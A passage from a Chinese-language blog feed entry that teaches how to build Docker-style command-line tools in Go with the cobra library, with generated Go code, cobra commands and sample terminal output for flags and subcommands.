class="line">	<span class="comment">// Here you will define your flags and configuration settings.</span></div><div class="line">	<span class="comment">// Cobra supports Persistent Flags, which, if defined here,</span></div><div class="line">	<span class="comment">// will be global for your application.</span></div><div class="line"></div><div class="line">	<span class="comment">// RootCmd.PersistentFlags().StringVar(&amp;cfgFile, "config", "", "config file (default is $HOME/.demo.yaml)")</span></div><div class="line">	<span class="comment">// Cobra also supports local flags, which will only run</span></div><div class="line">	<span class="comment">// when this action is called directly.</span></div><div class="line">	<span class="comment">// RootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")</span></div><div class="line"></div><div class="line">	RootCmd.Flags().StringVarP(&amp;name, <span class="string">"name"</span>, <span class="string">"n"</span>, <span class="string">""</span>, <span class="string">"persion's name"</span>)</div><div class="line">	RootCmd.Flags().IntVarP(&amp;age, <span class="string">"age"</span>, <span class="string">"a"</span>, <span class="number">0</span>, <span class="string">"person's age"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// // initConfig reads in config file and ENV variables if set.</span></div><div class="line"><span class="comment">// func initConfig() &#123;</span></div><div class="line"><span class="comment">// 	if cfgFile != "" &#123; // enable ability to specify config file via flag</span></div><div class="line"><span class="comment">// 		viper.SetConfigFile(cfgFile)</span></div><div class="line"><span class="comment">// 	&#125;</span></div><div class="line"></div><div class="line"><span class="comment">// 	viper.SetConfigName(".demo") // name of config file (without extension)</span></div><div class="line"><span class="comment">// 	viper.AddConfigPath("$HOME")  // adding home directory as first search path</span></div><div class="line"><span class="comment">// 	viper.AutomaticEnv()          // read in environment variables that match</span></div><div class="line"></div><div class="line"><span class="comment">// 	// If a config file is found, read it in.</span></div><div class="line"><span class="comment">// 	if err := viper.ReadInConfig(); err == nil &#123;</span></div><div class="line"><span class="comment">// 		fmt.Println("Using config file:", viper.ConfigFileUsed())</span></div><div class="line"><span class="comment">// 	&#125;</span></div><div class="line"><span class="comment">// &#125;</span></div></pre></td></tr></table></figure></p>
<p>最后测试下是不是我们想要的效果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ go run main.go -h</div><div class="line">Demo is a <span class="built_in">test</span> appcation <span class="keyword">for</span> <span class="built_in">print</span> things</div><div class="line"></div><div class="line">Usage:</div><div class="line">  demo [flags]</div><div class="line"></div><div class="line">Flags:</div><div class="line">  <span class="_">-a</span>, --age int       person<span class="string">'s age</span></div><div class="line">  -n, --name string   persion's name</div><div class="line">maojun@maojun-mbp$ go run main.go -n <span class="string">"test"</span> <span class="_">-a</span> 10</div><div class="line">My name is <span class="built_in">test</span>, my age is 10</div></pre></td></tr></table></figure></p>
<h3 id="带子命令的CLI"><a href="#带子命令的CLI" class="headerlink" title="带子命令的CLI"></a>带子命令的CLI</h3><p>对于复杂的情况，往往需要带子命令场景，比如Docker的CLI，而最终的效果应该是这样的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">demo</div><div class="line">Demo is a <span class="built_in">test</span> appcation <span class="keyword">for</span> <span class="built_in">print</span> things</div><div class="line"></div><div class="line">Usage:</div><div class="line">  demo [flags]</div><div class="line">  demo [<span class="built_in">command</span>]</div><div class="line"></div><div class="line">Available Commands:</div><div class="line">  <span class="built_in">test</span>        A brief description of your <span class="built_in">command</span></div><div class="line"></div><div class="line">Flags:</div><div class="line">  <span class="_">-a</span>, --age int       person<span class="string">'s age</span></div><div class="line">  -h, --help          help for demo</div><div class="line">  -n, --name string   person's name</div><div class="line"></div><div class="line">Use <span class="string">"demo [command] --help"</span> <span class="keyword">for</span> more information about a command.</div></pre></td></tr></table></figure></p>
<p>支持子命令是cobra的自己的功能，因此直接可以通过cobra生成带子命令的代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ cobra init demo</div><div class="line">Your Cobra application is ready at</div><div class="line">/Users/maojun/GoWorkDir/src/demo</div><div class="line">Give it a try by going there and running `go run main.go`</div><div class="line">Add commands to it by running `cobra add [cmdname]`</div><div class="line"></div><div class="line">maojun@maojun-mbp$ cobra add <span class="built_in">test</span></div><div class="line"><span class="built_in">test</span> created at /Users/maojun/GoWorkDir/src/cmd/test.go</div></pre></td></tr></table></figure></p>
<p>注释掉root.go那些不需要的地方, 然后修改生成的test.go<br><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Copyright © 2016 NAME HERE &lt;EMAIL ADDRESS&gt;</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the "License");</span></div><div class="line"><span class="comment">// you may not use this file except in compliance with the License.</span></div><div class="line"><span class="comment">// You may obtain a copy of the License at</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//     http://www.apache.org/licenses/LICENSE-2.0</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Unless required by applicable law or agreed to in writing, software</span></div><div class="line"><span class="comment">// distributed under the License is distributed on an "AS IS" BASIS,</span></div><div class="line"><span class="comment">// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></div><div class="line"><span class="comment">// See the License for the specific language governing permissions and</span></div><div class="line"><span class="comment">// limitations under the License.</span></div><div class="line"></div><div class="line"><span class="keyword">package</span> cmd</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/spf13/cobra"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">var</span> name <span class="keyword">string</span></div><div class="line"><span class="keyword">var</span> age <span class="keyword">int</span></div><div class="line"></div><div class="line"><span class="comment">// testCmd represents the test command</span></div><div class="line"><span class="keyword">var</span> testCmd = &amp;cobra.Command&#123;</div><div class="line">	Use:   <span class="string">"test"</span>,</div><div class="line">	Short: <span class="string">"A brief description of your command"</span>,</div><div class="line">	Long: <span class="string">`A longer description that spans multiple lines and likely contains examples</span></div><div class="line">and usage of using your command. For example:</div><div class="line"></div><div class="line">Cobra is a CLI library for Go that empowers applications.</div><div class="line">This application is a tool to generate the needed files</div><div class="line">to quickly create a Cobra application.`,</div><div class="line">	Run: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">		<span class="comment">// <span class="doctag">TODO:</span> Work your own magic here</span></div><div class="line">		fmt.Printf(<span class="string">"My name is %s, my age is %d\n"</span>, name, age)</div><div class="line">	&#125;,</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</div><div class="line">	RootCmd.AddCommand(testCmd)</div><div class="line"></div><div class="line">	<span class="comment">// Here you will define your flags and configuration settings.</span></div><div class="line"></div><div class="line">	<span class="comment">// Cobra supports Persistent Flags which will work for this command</span></div><div class="line">	<span class="comment">// and all subcommands, e.g.:</span></div><div class="line">	<span class="comment">// testCmd.PersistentFlags().String("foo", "", "A help for foo")</span></div><div class="line"></div><div class="line">	<span class="comment">// Cobra supports local flags which will only run when this command</span></div><div class="line">	<span class="comment">// is called directly, e.g.:</span></div><div class="line">	testCmd.Flags().StringVarP(&amp;name, <span class="string">"name"</span>, <span class="string">"n"</span>, <span class="string">""</span>, <span class="string">"persion's name"</span>)</div><div class="line">	testCmd.Flags().IntVarP(&amp;age, <span class="string">"age"</span>, <span class="string">"a"</span>, <span class="number">0</span>, <span class="string">"person's age"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最后测试下是不是我们想要的效果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ go run main.go -h</div><div class="line">A longer description that spans multiple lines and likely contains</div><div class="line">examples and usage of using your application. For example:</div><div class="line"></div><div class="line">Cobra is a CLI library <span class="keyword">for</span> Go that empowers applications.</div><div class="line">This application is a tool to generate the needed files</div><div class="line">to quickly create a Cobra application.</div><div class="line"></div><div class="line">Usage:</div><div class="line">  demo [<span class="built_in">command</span>]</div><div class="line"></div><div class="line">Available Commands:</div><div class="line">  <span class="built_in">test</span>        A brief description of your <span class="built_in">command</span></div><div class="line"></div><div class="line">Flags:</div><div class="line">      --config string   config file (default is <span class="variable">$HOME</span>/.demo.yaml)</div><div class="line">  -t, --toggle          Help message <span class="keyword">for</span> toggle</div><div class="line"></div><div class="line">Use <span class="string">"demo [command] --help"</span> <span class="keyword">for</span> more information about a command.</div><div class="line"></div><div class="line">maojun@maojun-mbp$ go run main.go <span class="built_in">test</span> -h</div><div class="line">A longer description that spans multiple lines and likely contains examples</div><div class="line">and usage of using your command. For example:</div><div class="line"></div><div class="line">Cobra is a CLI library <span class="keyword">for</span> Go that empowers applications.</div><div class="line">This application is a tool to generate the needed files</div><div class="line">to quickly create a Cobra application.</div><div class="line"></div><div class="line">Usage:</div><div class="line">  demo <span class="built_in">test</span> [flags]</div><div class="line"></div><div class="line">Flags:</div><div class="line">  <span class="_">-a</span>, --age int       person<span class="string">'s age</span></div><div class="line">  -n, --name string   persion's name</div><div class="line"></div><div class="line">Global Flags:</div><div class="line">      --config string   config file (default is <span class="variable">$HOME</span>/.demo.yaml)</div><div class="line"></div><div class="line"> maojun@maojun-mbp$ go run main.go <span class="built_in">test</span> <span class="_">-a</span> 10 -n <span class="built_in">test</span></div><div class="line">My name is <span class="built_in">test</span>, my age is 10</div></pre></td></tr></table></figure>
<p>命令行补全，man这些可以自己手动测试</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无论是Openstack还是Docker都有一个漂亮的命令行工具，Openstack的命令行工具主要使用的是Python的argparse库，至于Docker的CLI的实现还没看，但是今天看到了一个在Golang中 用于构建像Docker命令行风格的一个库:cobra&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Golang" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Golang/"/>
    
    
      <category term="cobra" scheme="https://blog.yumaojun.net/tags/cobra/"/>
    
  </entry>
  
</feed>
